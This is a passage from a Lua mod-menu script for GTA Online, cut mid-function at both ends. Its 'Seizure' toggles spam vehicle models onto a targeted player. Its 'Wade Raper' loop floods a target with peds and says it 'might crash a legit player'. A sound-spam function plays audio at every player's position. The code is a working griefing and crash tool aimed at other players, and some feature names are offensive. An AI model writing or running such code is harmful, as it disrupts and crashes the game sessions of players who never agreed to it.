    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)

    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)
end, nil, nil, COMMANDPERM_AGGRESSIVE)


menu.toggle_loop(seizures, "Seizure V2", {"seizurev2"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("cargoplane")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, 180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, 180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)

    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("cargoplane")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)

    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)

    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)
end, nil, nil, COMMANDPERM_AGGRESSIVE)


	menu.toggle(seizures, "Seizure V3", {"seizurev3"}, "", function(on_toggle)
        --notification("Seizure V3 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	if on_toggle then
			menu.trigger_commands("seizurev1" .. players.get_name(pid))
			menu.trigger_commands("seizurev2" .. players.get_name(pid))
	else
			menu.trigger_commands("seizurev1" .. players.get_name(pid))
			menu.trigger_commands("seizurev2" .. players.get_name(pid))
		end
	end)

   menu.toggle_loop(tormentplayer, "Village People 360 Wade Raper", {"waderape"}, "Send's a few wades (only works on others, not yourself) Might crash a legit player.", function(on_toggle)
            if pid ~= players.user() and players.exists(pid) then
                pedhash = 0xD266D9D6
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                --notification("Village People 360 Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true, colors.red)
                local bh = PLAYER.GET_PLAYER_PED(pid)
                local bi = ENTITY.GET_ENTITY_COORDS(bh, true)
                local bj = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                local bk = {}
                local bf = bi
                bf.x = bf.x
                bf.y = bf.y
                bf.z = bf.z
                for U = 1, 10 do
                    bk[U] = entities.create_ped(28, pedhash, bf, bj)
                    util.yield(100)
                end
                    util.toast("Done sending")
                util.yield(10)
                    util.toast("Cleaning up")
                for U = 1, 10 do
                    entities.delete_by_handle(bk[U])
                    util.yield(0)
                end
                util.yield(0)
                if not players.exists(pid) then
                    util.toast(a0[math.random(1, 13)], TOAST_ABOVE_MAP)
                    util.toast("Player left")
                end
                util.yield(0)
                aU = false
            end
            if aU then
            end
        end)

	cage_options = menu.list(griefing, "Cage Options", {}, "")

	menu.divider(cage_options, "Cage Options")



-- Yoinked From MoistScript, hope moist won't mind :)
SoundAnnoy = {
    { "All", "SHORT_PLAYER_SWITCH_SOUND_SET" },
    { "TENNIS_POINT_WON", "HUD_AWARDS" },
    {"Air_Defenses_Disabled", "DLC_sum20_Business_Battle_AC_Sounds"},
    {"Air_Defences_Activated", "DLC_sum20_Business_Battle_AC_Sounds"},
    {"TIME_LAPSE_MASTER", "0"},
    {"Fire", "DLC_BTL_Terrobyte_Turret_Sounds"},
    {"TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Timer_10s", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"TIMER_STOP", "HUD_MINI_GAME_SOUNDSET"},
    {"5s_To_Event_Start_Countdown", "GTAO_FM_Events_Soundset"},
    {"10s", "MP_MISSION_COUNTDOWN_SOUNDSET"},
    {"5s", "MP_MISSION_COUNTDOWN_SOUNDSET"},
    {"5_Second_Timer", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET"},
    {"3_2_1_NON_RACE", "HUD_MINI_GAME_SOUNDSET"},
    {"3_2_1", "HUD_MINI_GAME_SOUNDSET"},
    {"Arming_Countdown", "GTAO_Speed_Convoy_Soundset"},
    {"Bomb_Disarmed", "GTAO_Speed_Convoy_Soundset"},
    {"Boss_Blipped", "GTAO_Magnate_Hunt_Boss_SoundSet"},
    {"Boss_Message_Orange", "GTAO_Boss_Goons_FM_Soundset"},
    {"1st_Person_Transition", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"Apt_Style_Purchase", "DLC_APT_Apartment_SoundSet"},
    {"ARM_WRESTLING_WHOOSH_MASTER", "0"},
    {"ASSASSINATIONS_HOTEL_TIMER_COUNTDOWN", "ASSASSINATION_MULTI"},
    {"ATM_WINDOW", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"BASE_JUMP_PASSED", "HUD_AWARDS"},
    {"Bed", "WastedSounds"},
    {"Beep_Green", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Beep_Red", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Blade_Appear", "APT_BvS_Soundset"},
    {"BOATS_PLANES_HELIS_BOOM", "MP_LOBBY_SOUNDS"},
    {"Breaker_01", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"Breaker_02", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"Bus_Schedule_Pickup", "DLC_PRISON_BREAK_HEIST_SOUNDS"},
    {"CABLE_SNAPS", "CONSTRUCTION_ACCIDENT_1_SOUNDS"},
    {"CAM_PAN_DARTS", "HUD_MINI_GAME_SOUNDSET"},
    {"Camera_Shoot", "Phone_Soundset_Franklin"},
    {"CANCEL", "HUD_FREEMODE_SOUNDSET"},
    {"CAR_BIKE_WHOOSH", "MP_LOBBY_SOUNDS"},
    {"CHALLENGE_UNLOCKED", "HUD_AWARDS"},
    {"CHECKPOINT_AHEAD", "HUD_MINI_GAME_SOUNDSET"},
    {"CHECKPOINT_BEHIND", "HUD_MINI_GAME_SOUNDSET"},
 --   {"Checkpoint_Cash_Hit", "GTAO_FM_Events_Soundset"},
    {"Checkpoint_Hit", "GTAO_FM_Events_Soundset"},
    {"CHECKPOINT_MISSED", "HUD_MINI_GAME_SOUNDSET"},
    {"CHECKPOINT_NORMAL", "HUD_MINI_GAME_SOUNDSET"},
    {"CHECKPOINT_PERFECT", "HUD_MINI_GAME_SOUNDSET"},
    {"Checkpoint_Teammate", "GTAO_Shepherd_Sounds"},
    {"CHECKPOINT_UNDER_THE_BRIDGE", "HUD_MINI_GAME_SOUNDSET"},
    {"Click", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE"},
    {"Click_Fail", "WEB_NAVIGATION_SOUNDS_PHONE"},
    {"Click_Special", "WEB_NAVIGATION_SOUNDS_PHONE"},
    {"CLOSED", "MP_PROPERTIES_ELEVATOR_DOORS"},
    {"CONFIRM_BEEP", "HUD_MINI_GAME_SOUNDSET"},
    {"CONTINUE", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Continue_Appears", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Crash", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Criminal_Damage_High_Value", "GTAO_FM_Events_Soundset"},
    {"Criminal_Damage_Kill_Player", "GTAO_FM_Events_Soundset"},
    {"Criminal_Damage_Low_Value", "GTAO_FM_Events_Soundset"},
    {"Cycle_Item", "DLC_Dmod_Prop_Editor_Sounds"},
    {"DELETE", "HUD_DEATHMATCH_SOUNDSET"},
    {"Delete_Placed_Prop", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Deliver_Pick_Up", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"DiggerRevOneShot", "BulldozerDefault"},
    {"Door_Open", "DOCKS_HEIST_FINALE_2B_SOUNDS"},
    {"Drill_Pin_Break", "DLC_HEIST_FLEECA_SOUNDSET"},
    {"Dropped", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"EDIT", "HUD_DEATHMATCH_SOUNDSET"},
    {"Start_Squelch", "CB_RADIO_SFX"},
    {"End_Squelch", "CB_RADIO_SFX"},
    {"Enemy_Capture_Start", "GTAO_Magnate_Yacht_Attack_Soundset"},
    {"Enemy_Deliver", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"Enemy_Pick_Up", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"Enter_1st", "GTAO_FM_Events_Soundset"},
    {"Enter_Area", "DLC_Lowrider_Relay_Race_Sounds"},
    {"Enter_Capture_Zone", "DLC_Apartments_Drop_Zone_Sounds"},
    {"ERROR", "HUD_AMMO_SHOP_SOUNDSET"},
    {"Event_Message_Purple", "GTAO_FM_Events_Soundset"},
    {"Event_Start_Text", "GTAO_FM_Events_Soundset"},
    {"EXIT", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Exit_Capture_Zone", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Failure", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Falling_Crates", "EXILE_1"},
    {"Faster_Bar_Full", "RESPAWN_ONLINE_SOUNDSET"},
    {"Faster_Click", "RESPAWN_ONLINE_SOUNDSET"},
    {"FestiveGift", "Feed_Message_Sounds"},
    {"FIRST_PLACE", "HUD_MINI_GAME_SOUNDSET"},
    {"FLIGHT_SCHOOL_LESSON_PASSED", "HUD_AWARDS"},
    {"FLYING_STREAM_END_INSTANT", "FAMILY_5_SOUNDS"},
    {"FocusIn", "HintCamSounds"},
    {"FocusOut", "HintCamSounds"},
    {"Friend_Deliver", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"Friend_Pick_Up", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"GO", "HUD_MINI_GAME_SOUNDSET"},
    {"Goal", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"GOLF_BIRDIE", "HUD_AWARDS"},
    {"GOLF_EAGLE", "HUD_AWARDS"},
    {"GOLF_HUD_HOLE_IN_ONE_MASTER", "0"},
    {"GOLF_HUD_SCORECARD_MASTER", "0"},
    {"GOLF_NEW_RECORD", "HUD_AWARDS"},
    {"Goon_Paid_Small", "GTAO_Boss_Goons_FM_Soundset"},
    {"Grab_Parachute", "BASEJUMPS_SOUNDS"},
    {"Hack_Failed", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"Hack_Success", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"HACKING_CLICK", "0"},
    {"HACKING_CLICK_BAD", "0"},
    {"HACKING_CLICK_GOOD", "0"},
    {"HACKING_MOVE_CURSOR", "0"},
    {"Hang_Up", "Phone_SoundSet_Michael"},
    {"HIGHLIGHT", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Highlight_Accept", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Highlight_Cancel", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Highlight_Error", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Highlight_Move", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"HIGHLIGHT_NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Hit", "RESPAWN_ONLINE_SOUNDSET"},
    {"Hit_1", "LONG_PLAYER_SWITCH_SOUNDS"},
    {"Hit_In", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"Hit_Out", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"HORDE_COOL_DOWN_TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"HUD_FREEMODE_CANCEL_MASTER", "0"},
    {"Kill_List_Counter", "GTAO_FM_Events_Soundset"},
    {"LEADERBOARD", "HUD_MINI_GAME_SOUNDSET"},
    {"Lights_On", "GTAO_MUGSHOT_ROOM_SOUNDS"},
    {"LIMIT", "DLC_APT_YACHT_DOOR_SOUNDS"},
    {"Load_Scene", "DLC_Dmod_Prop_Editor_Sounds"},
    {"LOCAL_PLYR_CASH_COUNTER_COMPLETE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"LOCAL_PLYR_CASH_COUNTER_INCREASE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"LOOSE_MATCH", "HUD_MINI_GAME_SOUNDSET"},
    {"Lose_1st", "GTAO_FM_Events_Soundset"},
    {"LOSER", "HUD_AWARDS"},
    {"Map_Roll_Down", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Map_Roll_Up", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"MARKER_ERASE", "HEIST_BULLETIN_BOARD_SOUNDSET"},
    {"MARTIN1_DISTANT_TRAIN_HORNS_MASTER", "0"},
    {"MEDAL_BRONZE", "HUD_AWARDS"},
    {"MEDAL_GOLD", "HUD_AWARDS"},
    {"MEDAL_SILVER", "HUD_AWARDS"},
    {"MEDAL_UP", "HUD_MINI_GAME_SOUNDSET"},
    {"Menu_Accept", "Phone_SoundSet_Default"},
    {"Mission_Pass_Notify", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"MP_5_SECOND_TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_AWARD", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_Flash", "WastedSounds"},
    {"MP_IDLE_KICK", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_IDLE_TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_Impact", "WastedSounds"},
    {"MP_RANK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_WAVE_COMPLETE", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"NAV", "HUD_AMMO_SHOP_SOUNDSET"},
    {"Nav_Arrow_Ahead", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Nav_Arrow_Behind", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Nav_Arrow_Left", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Nav_Arrow_Right", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"NAV_LEFT_RIGHT", "HUD_FREEMODE_SOUNDSET"},
    {"NAV_UP_DOWN", "HUD_FREEMODE_SOUNDSET"},
    {"Near_Miss_Counter_Reset", "GTAO_FM_Events_Soundset"},
    {"NO", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    --{"Object_Collect_Player", "GTAO_FM_Events_Soundset"},
    {"Object_Dropped_Remote", "GTAO_FM_Events_Soundset"},
    {"Off_High", "MP_RADIO_SFX"},
    {"OK", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"ON", "NOIR_FILTER_SOUNDS"},
    {"On_Call_Player_Join", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    --{"Oneshot_Final", "MP_MISSION_COUNTDOWN_SOUNDSET"},
    {"OOB_Cancel", "GTAO_FM_Events_Soundset"},
    {"OOB_Start", "GTAO_FM_Events_Soundset"},
    {"OPEN_WINDOW", "LESTER1A_SOUNDS"},
    {"OPENED", "MP_PROPERTIES_ELEVATOR_DOORS"},
    {"OTHER_TEXT", "HUD_AWARDS"},
    {"Out_Of_Area", "DLC_Lowrider_Relay_Race_Sounds"},
    {"Out_Of_Bounds_Timer", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Paper_Shuffle", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Parcel_Vehicle_Lost", "GTAO_FM_Events_Soundset"},
    {"Payment_Non_Player", "DLC_HEISTS_GENERIC_SOUNDS"},
    {"Payment_Player", "DLC_HEISTS_GENERIC_SOUNDS"},
    {"Pen_Tick", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"PERSON_SCROLL", "HEIST_BULLETIN_BOARD_SOUNDSET"},
    {"PERSON_SELECT", "HEIST_BULLETIN_BOARD_SOUNDSET"},
    {"Phone_Generic_Key_02", "HUD_MINIGAME_SOUNDSET"},
    {"PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Pin_Bad", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"PIN_BUTTON", "ATM_SOUNDS"},
    {"Pin_Centred", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"Pin_Good", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"PIPES_LAND", "CONSTRUCTION_ACCIDENT_1_SOUNDS"},
    {"Place_Prop_Fail", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Place_Prop_Success", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Player_Collect", "DLC_PILOT_MP_HUD_SOUNDS"},
    {"Player_Enter_Line", "GTAO_FM_Cross_The_Line_Soundset"},
    {"Player_Exit_Line", "GTAO_FM_Cross_The_Line_Soundset"},
    {"Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Pre_Screen_Stinger", "DLC_HEISTS_FAILED_SCREEN_SOUNDS"},
    {"PS2A_MONEY_LOST", "PALETO_SCORE_2A_BANK_SS"},
    {"PURCHASE", "HUD_LIQUOR_STORE_SOUNDSET"},
    {"Put_Away", "Phone_SoundSet_Michael"},
    {"QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"QUIT_WHOOSH", "HUD_MINI_GAME_SOUNDSET"},
    {"RACE_PLACED", "HUD_AWARDS"},
    {"RAMP_DOWN", "TRUCK_RAMP_DOWN"},
    {"RAMP_UP", "TRUCK_RAMP_DOWN"},
    {"RANK_UP", "HUD_AWARDS"},
    {"REMOTE_PLYR_CASH_COUNTER_COMPLETE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"REMOTE_PLYR_CASH_COUNTER_INCREASE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Reset_Prop_Position", "DLC_Dmod_Prop_Editor_Sounds"},
    {"RESTART", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"RETRY", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET"},
    {"ROPE_CUT", "ROPE_CUT_SOUNDSET"},
    --{"ROUND_ENDING_STINGER_CUSTOM", "CELEBRATION_SOUNDSET"},
    {"Save_Scene", "DLC_Dmod_Prop_Editor_Sounds"},
    {"SCOPE_UI_MASTER", "0"},
    {"ScreenFlash", "WastedSounds"},
    {"SCREEN_SWIPE", "CELEBRATION_SWIPE"},
    {"SELECT", "HUD_FREEMODE_SOUNDSET"},
    {"Select_Placed_Prop", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Shard_Disappear", "GTAO_FM_Events_Soundset"},
    {"SHOOTING_RANGE_ROUND_OVER", "HUD_AWARDS"},
    {"Short_Transition_In", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"Short_Transition_Out", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"SKIP", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Start", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"STUN_COLLECT", "MINUTE_MAN_01_SOUNDSET"},
    {"Success", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Swap_Sides", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"SWING_SHUT", "GTAO_APT_DOOR_DOWNSTAIRS_GLASS_SOUNDS"},
    {"Tattooing_Oneshot", "TATTOOIST_SOUNDS"},
    {"Tattooing_Oneshot_Remove", "TATTOOIST_SOUNDS"},
    {"Team_Capture_Start", "GTAO_Magnate_Yacht_Attack_Soundset"},
    {"TENNIS_MATCH_POINT", "HUD_AWARDS"},
    {"TENNIS_POINT_WON", "HUD_AWARDS"},
    {"TextHit", "WastedSounds"},
    {"TOGGLE_ON", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Turn", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"UNDER_THE_BRIDGE", "HUD_AWARDS"},
    {"WAYPOINT_SET", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"WEAPON_ATTACHMENT_EQUIP", "HUD_AMMO_SHOP_SOUNDSET"},
    {"WEAPON_ATTACHMENT_UNEQUIP", "HUD_AMMO_SHOP_SOUNDSET"},
    {"WEAPON_PURCHASE", "HUD_AMMO_SHOP_SOUNDSET"},
    {"WEAPON_SELECT_ARMOR", "HUD_AMMO_SHOP_SOUNDSET"},
    {"Whoosh_1s_L_to_R", "MP_LOBBY_SOUNDS"},
    {"Whoosh_1s_R_to_L", "MP_LOBBY_SOUNDS"},
    {"WIN", "HUD_AWARDS"},
    {"Zone_Enemy_Capture", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Zone_Neutral", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Zone_Team_Capture", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Zoom_In", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Zoom_Left", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Zoom_Out", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Zoom_Right", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Checkpoint_Finish_Winner", "DLC_Tuner_Car_Meet_Test_Area_Events_Sounds"},
    {"Checkpoint", "DLC_Tuner_Car_Meet_Test_Area_Events_Sounds"},
}

local getPlayerPed = PLAYER.GET_PLAYER_PED
local getEntityCoords = ENTITY.GET_ENTITY_COORDS


local function AudioAnnoyance(Ker_SND, Ker_AUD)
    for i=0, 31, 1 do
        Ker_pped = getPlayerPed(i)
        Ker_pos = getEntityCoords(Ker_pped)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, Ker_SND, Ker_pos.x, Ker_pos.y, Ker_pos.z, Ker_AUD, true, 999999999, true)
    end
end

local function playerActionsSetup(pid)
